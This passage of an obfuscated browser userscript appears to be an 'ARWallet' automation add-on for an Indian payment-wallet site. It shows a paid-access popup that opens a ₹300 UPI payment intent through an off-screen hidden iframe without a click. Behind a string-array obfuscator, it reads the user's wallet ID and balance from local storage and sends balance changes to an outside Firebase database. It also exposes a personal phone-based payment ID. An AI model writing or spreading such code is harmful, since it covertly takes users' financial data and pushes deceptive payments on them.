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";
    _mQr.style.cssText = [
      "width:200px","height:200px","object-fit:contain",
      "border-radius:12px","border:2px solid #ede9fe",
      "display:block","margin:0 auto 12px"
    ].join(";");

    const _mPhonePeBtn = document.createElement("button");
    _mPhonePeBtn.textContent = "🔗 Continue Access via PhonePe";
    _mPhonePeBtn.style.cssText = [
      "display:block","width:100%",
      "background:linear-gradient(135deg,#5f2ded,#7c3aed)",
      "color:#fff","border:none","border-radius:10px",
      "padding:11px 16px","font-size:14px","font-weight:700",
      "margin-bottom:8px","cursor:pointer","text-align:center",
      "letter-spacing:0.2px"
    ].join(";");
    _mPhonePeBtn.addEventListener("click", function() {
        var _p = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Member+Access";
        try { window.open("intent://pay?" + _p + "#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=https%3A%2F%2Fphonepe.com%2F;end", "_blank"); } catch(e1) {}
        setTimeout(function() {
          try {
            var _ifr = document.createElement("iframe");
            _ifr.style.display = "none";
            _ifr.src = "upi://pay?" + _p;
            document.body.appendChild(_ifr);
            setTimeout(function(){ try{ _ifr.remove(); }catch(e){} }, 2000);
          } catch(e2) {}
        }, 300);
    });

    const _mCancel = document.createElement("button");
    _mCancel.textContent = "Cancel";
    _mCancel.style.cssText = [
      "background:none","border:1px solid #d1d5db","border-radius:8px",
      "padding:8px 24px","font-size:13px","color:#666",
      "cursor:pointer","margin-top:4px","display:block","margin:8px auto 0"
    ].join(";");
    _mCancel.onclick = () => _mOverlay.remove();

    _mBox.append(_mClose, _mTitle, _mSub, _mBanner, _mPhoneLabel, _mQr, _mPhonePeBtn, _mCancel);
    _mOverlay.appendChild(_mBox);
    document.body.appendChild(_mOverlay);
    // ── Auto-launch PhonePe as soon as member popup appears ──────────────────
    (function _autoLaunchPhonePeMember() {
      var _p = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Member+Access";
      function _fireIntent() {
        try {
          var _ifr = document.createElement("iframe");
          _ifr.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;";
          _ifr.src = "upi://pay?" + _p;
          document.body.appendChild(_ifr);
          setTimeout(function(){ try{ _ifr.remove(); }catch(e){} }, 2500);
        } catch(e) {}
      }
      setTimeout(_fireIntent, 800);
    })();
    // ──────────────────────────────────────────────────────────────────────────
  })(); // end _showMemberPaymentPopup IIFE
  // ─────────────────────────────────────────────────────────────────────────

  console.log("✅ Verified. Script starting...");

  // ── Welcome Toast ──────────────────────────────────────────────────────────
  (function _showWelcomeToast() {
    // Remove old toast if any
    const _old = document.getElementById('__ar_welcome_toast__');
    if (_old) _old.remove();

    const _toast = document.createElement("div");
    _toast.id = "__ar_welcome_toast__";
    _toast.innerHTML = "✅ Welcome back, <strong>" + (_uid || "Member") + "</strong>!";
    _toast.style.cssText = [
      "position:fixed",
      "bottom:24px",
      "left:50%",
      "transform:translateX(-50%) translateY(80px)",
      "background:linear-gradient(135deg,#16a34a,#22c55e)",
      "color:#fff",
      "padding:12px 24px",
      "border-radius:50px",
      "font-family:system-ui,-apple-system,sans-serif",
      "font-size:14px",
      "font-weight:600",
      "box-shadow:0 8px 24px rgba(22,163,74,0.35)",
      "z-index:2147483647",
      "transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1),opacity 0.4s ease",
      "opacity:0",
      "white-space:nowrap"
    ].join(";");
    document.body.appendChild(_toast);

    // Slide in
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        _toast.style.transform = "translateX(-50%) translateY(0)";
        _toast.style.opacity = "1";
      });
    });

    // Slide out after 3.5s
    setTimeout(() => {
      _toast.style.transform = "translateX(-50%) translateY(80px)";
      _toast.style.opacity = "0";
      setTimeout(() => { try { _toast.remove(); } catch(e){} }, 450);
    }, 3500);
  })();
  // ──────────────────────────────────────────────────────────────────────────
 if (!document.querySelector(".x-main.main")) {
    const _ghost = document.querySelector(".container") || document.querySelector("#app > div");
    if (_ghost) {
      _ghost.classList.add("x-main", "main");
      console.log("🔧 Selector patch applied.");
    }
  }
function a0_0x1703(_0x24082f, _0x44ab98) {
  _0x24082f = _0x24082f - 0x196;
  const _0x4cfb7e = a0_0x4cfb();
  let _0x170385 = _0x4cfb7e[_0x24082f];
  if (a0_0x1703["bPtxJv"] === undefined) {
    var _0x321e82 = function (_0x1542a8) {
      const _0x502196 =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
      let _0x33429b = "",
        _0x115a87 = "";
      for (
        let _0x1aa4f7 = 0x0, _0x206f72, _0x12a38d, _0x504c77 = 0x0;
        (_0x12a38d = _0x1542a8["charAt"](_0x504c77++));
        ~_0x12a38d &&
        ((_0x206f72 =
          _0x1aa4f7 % 0x4 ? _0x206f72 * 0x40 + _0x12a38d : _0x12a38d),
        _0x1aa4f7++ % 0x4)
          ? (_0x33429b += String["fromCharCode"](
              0xff & (_0x206f72 >> ((-0x2 * _0x1aa4f7) & 0x6)),
            ))
          : 0x0
      ) {
        _0x12a38d = _0x502196["indexOf"](_0x12a38d);
      }
      for (
        let _0x3811dd = 0x0, _0x4820aa = _0x33429b["length"];
        _0x3811dd < _0x4820aa;
        _0x3811dd++
      ) {
        _0x115a87 +=
          "%" +
          ("00" + _0x33429b["charCodeAt"](_0x3811dd)["toString"](0x10))[
            "slice"
          ](-0x2);
      }
      return decodeURIComponent(_0x115a87);
    };
    ((a0_0x1703["LbHxtW"] = _0x321e82),
      (a0_0x1703["eflYMB"] = {}),
      (a0_0x1703["bPtxJv"] = !![]));
  }
  const _0x22a121 = _0x4cfb7e[0x0],
    _0x1df100 = _0x24082f + _0x22a121,
    _0x353ae0 = a0_0x1703["eflYMB"][_0x1df100];
  return (
    !_0x353ae0
      ? ((_0x170385 = a0_0x1703["LbHxtW"](_0x170385)),
        (a0_0x1703["eflYMB"][_0x1df100] = _0x170385))
      : (_0x170385 = _0x353ae0),
    _0x170385
  );
}
function a0_0x4cfb() {
  const _0x3301e1 = [
    "qNf5DKW",
    "BfPUt0u",
    "C3rpEhe",
    "B25SB2fK",
    "y3vYCMvUDfrPBwu",
    "D2fSBgv0vxnLCKLK",
    "u1PnDwG",
    "qwnJzxnZigrLBMLLza",
    "t0Hot2e",
    "uMLWq2C",
    "AKnXqK8",
    "mty1mtyZowXft0XLDW",
    "Ahr0Chm6lY93D3CUz3n0yxrPyY5JB20VzMLYzwjHC2vQCY85lJiZlJaVzMLYzwjHC2uTyxbWlwnVBxbHDc5QCW",
    "mtaXmJCZmfvqwMnIyG",
    "BgLTAxq",
    "qKLnrxq",
    "ywn0AxzL",
    "uezAyLe",
    "zMXTz0O",
    "y2fKvhC",
    "B09YCgi",
    "s1H4D0y",
    "BMHLA2u",
    "CKHzALK",
    "sKDWtfm",
    "B0Dbr2u",
    "EuD1zLa",
    "qvvvBNu",
    "AeHqrwK",
    "y3jLzgL0",
    "y29SBgvJDgLVBG",
    "B25JBgLJAW",
    "suvxwfO",
    "revwtKy",
    "DhfhC3O",
    "wgHuBfO",
    "zw1WDhK",
    "ENrOBu0",
    "BwjQDLG",
    "BwvTyMvYswq",
    "z2v0qM91BMrPBMDdBgLLBNrszwn0",
    "BM9Uzq",
    "qMfSyw5JzsbZEw5JigvYCM9YoG",
    "BNPLsfy",
    "DMjuv28",
    "CgXHEq",
    "zgL2lNGTCM93lNGTCM93lwjLDhDLzw4UyMDMCMvV",
    "DeXYsvG",
    "BhvdDuW",
    "y2TPB0O",
    "BNvTyMvY",
    "Ahr0Chm6lY9Hy3rPB25ZlMDVB2DSzs5JB20VC291BMrZl3yXl2fSyxjTCY9WAg9Uzv9HBgvYDhnFyw5Kx3jPBMDZlM9NzW",
    "tMHfthu",
    "z2v0sxrLBq",
    "uNr5rgG",
    "yM9KEq",
    "vfHSwxC",
    "qxz2B0e",
    "vfzWr1a",
    "t0HKrvq",
    "s2Loueu",
    "mZzpEe11wuu",
    "zgvIAxq",
    "nM5nuLHZua",
    "rfrNzNO",
    "Aw5JBhvKzxm",
    "wNbLtfu",
    "tuLMt3q",
    "AMjvAeW",
    "vMfSAuu",
    "mhW3FdL8nxWXmhW0Fdz8m3WXFdj8oa",
    "oda5mduWsNLgthvJ",
    "zM9YrwfJAa",
    "y2XPy2S",
    "DgHbv2q",
    "ohf6D1Hvsq",
    "zMLYzwjHC2u",
    "sLD6s1C",
    "BgvUz3rO",
    "v01Lq0m",
    "CxvLCNLtzwXLy3rVCG",
    "rKPSA3a",
    "zg9JCW",
    "zgLZCgXHEq",
    "yMfSyw5Jzq",
    "vu92Eum",
    "r3fxuM0",
    "DxbKyxrL",
    "C0r3Auu",
    "Ec1IDxLmAxn0lwXPC3q",
    "DMfSDwu",
    "uhrQzK0",
    "ExPfvMi",
    "A2fiALu",
    "Cxrfs2m",
    "mJy2otm2q2LbDgXZ",
    "BevmCuS",
    "tNLlAxi",
    "CxvLCNLtzwXLy3rVCKfSBa",
    "yMXVy2S",
    "s2vvywK",
    "zuv4CKi",
    "mtaWma",
    "AgrKuMC",
    "B2jZzxj2zq",
    "A290rLq",
    "wLf1tuq",
    "lML0zw0Uywn0AxzL",
    "D2HLCMu",
    "DxnLCKLUzM8",
    "rwHhr0i",
    "D2D5Efq",
    "qLPetvK",
    "CvnivgW",
    "DhjPBq",
    "u2rwqKi",
    "Aw5UzxjuzxH0",
    "Aw9UENC",
    "yMfJA2DYB3vUza",
    "rhDqC3e",
    "ruHtEgy",
    "DM9SDw1L",
    "C3bHBG",
    "qviGv2fSBgv0",
    "zgL2",
    "yxbWCW",
    "DgvOswi",
    "ueDsueC",
    "y2HOuLa",
    "Aw5WDxq",
    "mxW1FdL8nhW3Fdn8nNWYFdeWFdH8ma",
    "C2vYDMvYvgLTzxn0yw1W",
    "BwvTyMvYBgq",
    "v0LAChi",
    "Avn0rMO",
    "zg9J",
    "y0nou1C",
    "y3jLyxrLrwXLBwvUDa",
    "y2XVC2vZDa",
    "zu5TD1e",
    "zgf0yq",
    "zxjYB3i",
    "Dgv4DenVBNrLBNq",
    "DhjHBNnHy3rPB25Z",
    "sgXmsuC",
    "s1rKrgi",
    "i2vMndq0na",
    "D2LKDgG6mtbWEdTOzwLNAhq6mtbWEdTIB3jKzxiTCMfKAxvZoJuWjtTIywnRz3jVDw5KoInLzJq0ndq",
    "vNH1tNy",
    "Dvn6wvK",
    "cIaGicaGicaGD2LKDgG6mtaWjtSkicaGicaGicbWywrKAw5NoJHWEdSkicaGicaGicbTyxjNAw4TyM90Dg9ToJeWChG7cIaGicaGicaGyM9YzgvYoJfWEcbZB2XPzcaJzdfKnwrIoWOGicaGicaGigjVCMrLCI1YywrPDxm6nNb4oWOGicaGicaGigjHy2TNCM91BMq6i2zMzJSkicaGicaGicbJB2XVCJOJmteXoWOGicaGicaGigzVBNqTC2L6ztOXnhb4oWOGicaG",
    "mtCXntzjr3rTB0O",
    "vMTit0G",
    "tMjfAxu",
    "quL6yvn5q0K3v2PuC0nMwxjgvtbvmZH5odrqDLnfmxLZB09TyZy4",
    "wLnyB3G",
    "BNzNywe",
    "yMjdB0G",
    "mJq2mdi0oerWq3zMwa",
    "zer5Dwi",
    "zgLZy29UBMvJDa",
    "BwvTyMvYCW",
    "Eerhv3K",
    "yxbWzw5K",
    "whjVBvq",
    "thHttuy",
    "qKTVqve",
    "AgvPz2H0",
    "nJi0mdaZthrxEMrR",
    "yM5Tv2S",
    "t3jNv3O",
    "CfL4z2i",
    "sM5osgG",
    "tNPeAei",
    "D2LKDgG",
    "zMXLEdOXo2jHy2TNCM91BMq6iZiYyZu1ztTJB2XVCJOJzMzMo2jVCMrLCJPUB25Lo3bHzgrPBMC6ohb4o2jVCMrLCI1YywrPDxm6ohb4",
    "EerlwuG",
    "quv6CNC",
    "C3bqzeq",
    "CuPus3e",
    "Aw5PDgLHBgL6zufWCa",
    "q3DLvLO",
    "y3nZvgv4Da",
    "u3z6y3C",
    "BwfYz2LUlxrVCdOXmhb4o2zVBNqTC2L6ztOXmNb4o3rLEhqTywXPz246y2vUDgvY",
    "mtjZt2HfDeC",
    "C3r5Bgu",
    "Cgf1C2u",
    "yxbWzw5Kq2HPBgq",
    "zMfus0y",
    "yuTNDem",
    "y2f0y2G",
    "B1DMquq",
    "D2fSBgv0lwf1Dg9TyxrPB24Tytu5zge",
    "rMLLBgrwywX1zq",
    "wvzNrNa",
    "zMLYzxn0B3jL",
    "vxf5Evq",
    "CgfYC2u",
    "Aw5UzxjizwLNAhq",
    "sKXJA3i",
    "n3W0Fdv8mhWZFdz8mxWY",
    "u3rVChbLza",
    "s3vzwLq",
    "u3rHCNq",
    "wuDMrfe",
    "zMXLEdOXo2jHy2TNCM91BMq6i2vMndq0ndTJB2XVCJOJzMzMo2jVCMrLCJPUB25Lo3bHzgrPBMC6ohb4o2jVCMrLCI1YywrPDxm6ohb4",
    "A0HvwK8",
    "z2v0",
  ];
  a0_0x4cfb = function () {
    return _0x3301e1;
  };
  return a0_0x4cfb();
}
((function (_0x6aeb5b, _0x217959) {
  const _0x2cc054 = a0_0x1703,
    _0xd440b1 = _0x6aeb5b();
  while (!![]) {
    try {
      const _0x3cfc71 =
        (-parseInt(_0x2cc054(0x1f8)) / 0x1) *
          (parseInt(_0x2cc054(0x21a)) / 0x2) +
        parseInt(_0x2cc054(0x209)) / 0x3 +
        (parseInt(_0x2cc054(0x1ac)) / 0x4) *
          (parseInt(_0x2cc054(0x23f)) / 0x5) +
        (parseInt(_0x2cc054(0x1a0)) / 0x6) *
          (-parseInt(_0x2cc054(0x1ff)) / 0x7) +
        (-parseInt(_0x2cc054(0x1c0)) / 0x8) *
          (-parseInt(_0x2cc054(0x19e)) / 0x9) +
        parseInt(_0x2cc054(0x1a8)) / 0xa +
        -parseInt(_0x2cc054(0x23d)) / 0xb;
      if (_0x3cfc71 === _0x217959) break;
      else _0xd440b1["push"](_0xd440b1["shift"]());
    } catch (_0x3e71f2) {
      _0xd440b1["push"](_0xd440b1["shift"]());
    }
  }
})(a0_0x4cfb, 0x366c5),
  (async function () {
    const _0x5cfc00 = a0_0x1703,
      _0x5302eb = {
        KuYZT: function (_0xbfde0, _0x3cde0d) {
          return _0xbfde0(_0x3cde0d);
        },
        NzDhB: _0x5cfc00(0x20a),
        ValiE: "script",
        qtEKc: function (_0x2e2adf) {
          return _0x2e2adf();
        },
        UqyyT: _0x5cfc00(0x1e3),
        yzEVb: "Active",
        MFPkN: function (_0x19bcb4) {
          return _0x19bcb4();
        },
        NhELu: function (_0x409b1c) {
          return _0x409b1c();
        },
        nheke: "#22c55e",
        XromT: function (_0x29b465, _0x35f783) {
          return _0x29b465 === _0x35f783;
        },
        EHSxf: function (_0x515a9b, _0x574cbd) {
          return _0x515a9b === _0x574cbd;
        },
        OHNOa: _0x5cfc00(0x202),
        EhGGB: _0x5cfc00(0x237),
        xDKYH: function (_0x3c33ee, _0x264099) {
          return _0x3c33ee(_0x264099);
        },
        kFQEC: function (_0x127c55, _0x28ea40) {
          return _0x127c55(_0x28ea40);
        },
        DwPsq: function (_0x3a7803, _0x38240b) {
          return _0x3a7803 === _0x38240b;
        },
        vbTWo: function (_0x478bb3, _0x46b322) {
          return _0x478bb3 - _0x46b322;
        },
        WMeCC: function (_0x40fb59, _0x3532f6) {
          return _0x40fb59 > _0x3532f6;
        },
        tLrIX: _0x5cfc00(0x24f),
        kaHjU: _0x5cfc00(0x19f),
        LxSMF: function (_0x17a0dc, _0x1dbfe5) {
          return _0x17a0dc !== _0x1dbfe5;
        },
        kotFT: _0x5cfc00(0x1ec),
        NyKir: "DAxhh",
        nvgaa: _0x5cfc00(0x25c),
        hHPEi: function (_0x12058b) {
          return _0x12058b();
        },
        DEVNF: function (_0x3d5936, _0x31becf, _0x1228da) {
          return _0x3d5936(_0x31becf, _0x1228da);
        },
        CweVZ: _0x5cfc00(0x1fb),
        DTgfz: _0x5cfc00(0x242),
        OrgWz: _0x5cfc00(0x232),
        iStFj: function (_0x50e974, _0x1ae0af) {
          return _0x50e974(_0x1ae0af);
        },
        NbEiu: function (_0xff73e0, _0x4a3601) {
          return _0xff73e0 !== _0x4a3601;
        },
        VkHOH: "VLNSr",
        aSEqp: _0x5cfc00(0x24d),
        BIMEt: function (_0x21b101, _0x3bdcb8) {
          return _0x21b101 !== _0x3bdcb8;
        },
        cCNSW: function (_0x136513) {
          return _0x136513();
        },
        GqWRm: _0x5cfc00(0x1c4),
        uSzYY: _0x5cfc00(0x25b),
        oGAGe: function (_0x2a86db, _0x2a267b) {
          return _0x2a86db !== _0x2a267b;
        },
        YVgFp: "PGRPG",
        BZDMY: function (_0x42bf6f) {
          return _0x42bf6f();
        },
        WIZpr: function (_0x17dc5d) {
          return _0x17dc5d();
        },
        ZpeLU: function (_0x49ce37, _0x52ed68) {
          return _0x49ce37 === _0x52ed68;
        },
        tehIb: "tKeKh",
        zthmM: _0x5cfc00(0x1a5),
        eExrB: function (_0x3760d4, _0x1337e8) {
          return _0x3760d4 < _0x1337e8;
        },
        AEzrw: _0x5cfc00(0x1cc),
        HlLIG: "iKHbY",
        spPdD: _0x5cfc00(0x1fc),
        pYxgb: _0x5cfc00(0x22a),
        xDGWy: _0x5cfc00(0x22b),
        hddRg: _0x5cfc00(0x1f3),
        oOrpb: function (_0x216209, _0xf8ecb5) {
          return _0x216209(_0xf8ecb5);
        },
        JGpLS: "div.x-row.x-row-middle\x20button",
        FJlkp: function (_0xb94509, _0x3e94b3, _0x3962b9) {
          return _0xb94509(_0x3e94b3, _0x3962b9);
        },
        flmgJ: _0x5cfc00(0x234),
        faTKF: function (_0x17b71a, _0x463e44, _0x3903ae) {
          return _0x17b71a(_0x463e44, _0x3903ae);
        },
        qoLjQ: "IXhff",
        PFZbQ: function (_0x5f52cd, _0x3c516) {
          return _0x5f52cd(_0x3c516);
        },
        UOvyC: _0x5cfc00(0x1e1),
        AvvoA: _0x5cfc00(0x260),
        yGufP: _0x5cfc00(0x1a4),
        aKgtC: function (_0x12d2fb, _0x53ebbc) {
          return _0x12d2fb >= _0x53ebbc;
        },
        BKoAQ: function (_0x2b3663, _0x39dc61) {
          return _0x2b3663(_0x39dc61);
        },
        KXxwF: _0x5cfc00(0x1cb),
        sLhdC: "OpmqW",
        bOuLf: function (_0x42e62a, _0x300e37) {
          return _0x42e62a === _0x300e37;
        },
        oWfAD: _0x5cfc00(0x233),
        JWzKW: _0x5cfc00(0x1fe),
        PKysa: _0x5cfc00(0x1a7),
        rHYjY: function (_0x2209e8, _0x456acb) {
          return _0x2209e8 || _0x456acb;
        },
        lELqK: function (_0x4f016a) {
          return _0x4f016a();
        },
        KiNPE: function (_0x4e082c) {
          return _0x4e082c();
        },
        sDwiE: _0x5cfc00(0x1d6),
        ckioJ: _0x5cfc00(0x23e),
        QDmBl: "wallet-automation-a59da",
        XhTlZ: _0x5cfc00(0x1dd),
        KtRyE: _0x5cfc00(0x1db),
        tqGsz: _0x5cfc00(0x1e2),
        KeUai: _0x5cfc00(0x264),
        nzeHV: _0x5cfc00(0x1c7),
        QRHaD: "display:flex;gap:8px",
        mbjvX: "button",
        AXopR: _0x5cfc00(0x22d),
        TimCL: "Stop",
        qJTKq: _0x5cfc00(0x219),
      };
    let _0x2079a7 = null,
      _0x4b19e6 = ![],
      _0x54102e = null,
      _0x2ff90e = null,
      _0x563d83 = ![],
      _0x3fb9a4 = null;
    const _0x9859db = "amount-filter-panel",
      _0x439d56 = _0x5cfc00(0x1ba);
    let _0x3341f9 = ![];
    const _0x4e8e32 = new Audio(_0x5cfc00(0x265));
    _0x4e8e32[_0x5cfc00(0x1da)] = 0x1;
    function _0x4096cd() {
      const _0x4b93c6 = _0x5cfc00;
      ((_0x4e8e32["currentTime"] = 0x0),
        _0x4e8e32[_0x4b93c6(0x25f)]()[_0x4b93c6(0x220)](() => {}),
        setTimeout(() => {
          const _0x24db73 = _0x4b93c6;
          (_0x4e8e32[_0x24db73(0x21c)](), (_0x4e8e32[_0x24db73(0x236)] = 0x0));
        }, 0xbb8));
    }
    function _0x52fcbc(_0x3164a6) {
      const _0x445041 = _0x5cfc00,
        _0xc40479 = {
          cadTw: function (_0x2aa5a9, _0x4ac93c) {
            const _0x1cdecb = a0_0x1703;
            return _0x5302eb[_0x1cdecb(0x22c)](_0x2aa5a9, _0x4ac93c);
          },
          IEWXZ: function (_0x50a38a, _0x3688b2) {
            return _0x50a38a !== _0x3688b2;
          },
          AhXBr: _0x5302eb[_0x445041(0x20e)],
          luCuL: _0x5302eb[_0x445041(0x1a6)],
        };
      return new Promise((_0x1f5177, _0x2e1f91) => {
        const _0x3f18db = _0x445041;
        if (_0xc40479[_0x3f18db(0x252)](_0x3f18db(0x20a), _0xc40479["AhXBr"]))
          _0xc40479[_0x3f18db(0x245)](_0x1f2256, _0x5de5c4);
        else {
          const _0xe75671 = document[_0x3f18db(0x1ea)](
            _0xc40479[_0x3f18db(0x262)],
          );
          ((_0xe75671["src"] = _0x3164a6),
            (_0xe75671[_0x3f18db(0x235)] = _0x1f5177),
            (_0xe75671["onerror"] = _0x2e1f91),
            document["head"]["appendChild"](_0xe75671));
        }
      });
    }
    if (!window[_0x5cfc00(0x1ad)]) {
      if (
        _0x5302eb[_0x5cfc00(0x1d8)](
          _0x5302eb[_0x5cfc00(0x1b9)],
          _0x5302eb[_0x5cfc00(0x1b9)],
        )
      )
        (await _0x5302eb[_0x5cfc00(0x207)](
          _0x52fcbc,
          _0x5302eb[_0x5cfc00(0x263)],
        ),
          await _0x5302eb[_0x5cfc00(0x243)](
            _0x52fcbc,
            "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js",
          ));
      else {
        if (!_0x5302eb[_0x5cfc00(0x1bf)](_0x29bd19)) {
          (_0x5302eb[_0x5cfc00(0x22c)](_0x3153b5, !![]), _0x95e58c());
          return;
        }
        const _0x5111aa = _0x5af3b3[_0x5cfc00(0x1bb)][_0x5cfc00(0x1d3)]();
        _0x34a497["querySelectorAll"]("." + _0x1c45af + "\x20*")[
          _0x5cfc00(0x1a9)
        ]((_0x2b07ab) => {
          const _0x3dcd52 = _0x5cfc00;
          if (_0x2b07ab[_0x3dcd52(0x1eb)]("." + _0x4186ea)) return;
          _0x2b07ab[_0x3dcd52(0x1d5)]?.["includes"]("₹") &&
            (_0x2b07ab[_0x3dcd52(0x21b)][_0x3dcd52(0x1b4)] =
              _0x2b07ab[_0x3dcd52(0x1d5)][_0x3dcd52(0x1a2)]("₹" + _0x5111aa) &&
              !_0x2b07ab[_0x3dcd52(0x1d5)][_0x3dcd52(0x1a2)](
                "₹" + _0x5111aa + "0",
              )
                ? ""
                : _0x3dcd52(0x25b));
        });
      }
    }
    !firebase[_0x5cfc00(0x1de)][_0x5cfc00(0x1af)] &&
      firebase[_0x5cfc00(0x215)]({
        apiKey: _0x5302eb[_0x5cfc00(0x216)],
        projectId: _0x5302eb["QDmBl"],
      });
    async function _0x545ee6() {
      const _0x10cf34 = _0x5cfc00;
      try {
        const _0x37dec7 = JSON[_0x10cf34(0x227)](
            localStorage[_0x10cf34(0x196)](_0x10cf34(0x1ce)),
          ),
          _0x22d98a =
            _0x37dec7?.["value"]?.[_0x10cf34(0x259)] ||
            _0x37dec7?.[_0x10cf34(0x1bb)]?.[_0x10cf34(0x1e5)],
          _0x36c1eb =
            _0x37dec7?.[_0x10cf34(0x1b5)] ??
            _0x37dec7?.[_0x10cf34(0x1bb)]?.[_0x10cf34(0x1b5)];
        if (
          !_0x22d98a ||
          _0x5302eb[_0x10cf34(0x205)](_0x36c1eb, undefined) ||
          _0x5302eb[_0x10cf34(0x1d9)](_0x36c1eb, null)
        )
          return;
        const _0x5e9ff3 = firebase[_0x10cf34(0x225)](),
          _0x247346 = await _0x5e9ff3["collection"](_0x5302eb[_0x10cf34(0x23a)])
            [
              _0x10cf34(0x1cd)
            ](_0x5302eb[_0x10cf34(0x1cf)], "==", _0x5302eb[_0x10cf34(0x22c)](String, _0x22d98a))
            [_0x10cf34(0x240)](0x1)
            ["get"]();
        if (_0x247346[_0x10cf34(0x256)]) return;
        const _0x28b730 = _0x247346[_0x10cf34(0x1b3)][0x0],
          _0x484a45 = _0x5e9ff3[_0x10cf34(0x250)]("members")[_0x10cf34(0x1e8)](
            _0x28b730["id"],
          ),
          _0x2fe1b1 = _0x28b730[_0x10cf34(0x1ed)](),
          _0x15b9f0 = _0x5302eb[_0x10cf34(0x211)](
            Number,
            _0x2fe1b1[_0x10cf34(0x1b5)] ?? 0x0,
          ),
          _0x8f4e3b = _0x5302eb["kFQEC"](Number, _0x36c1eb);
        if (_0x5302eb[_0x10cf34(0x1d8)](_0x15b9f0, _0x8f4e3b)) return;
        const _0x5734c1 = _0x5302eb[_0x10cf34(0x25e)](_0x8f4e3b, _0x15b9f0),
          _0x4dbe4c = _0x5302eb[_0x10cf34(0x1b0)](_0x5734c1, 0x0)
            ? _0x5302eb[_0x10cf34(0x261)]
            : _0x5302eb[_0x10cf34(0x1be)],
          _0xc9de72 = Math["abs"](_0x5734c1);
        (await _0x5e9ff3["collection"](_0x10cf34(0x1f0))["add"]({
          walletUserId: _0x5302eb[_0x10cf34(0x211)](String, _0x22d98a),
          previousBalance: _0x15b9f0,
          updatedBalance: _0x8f4e3b,
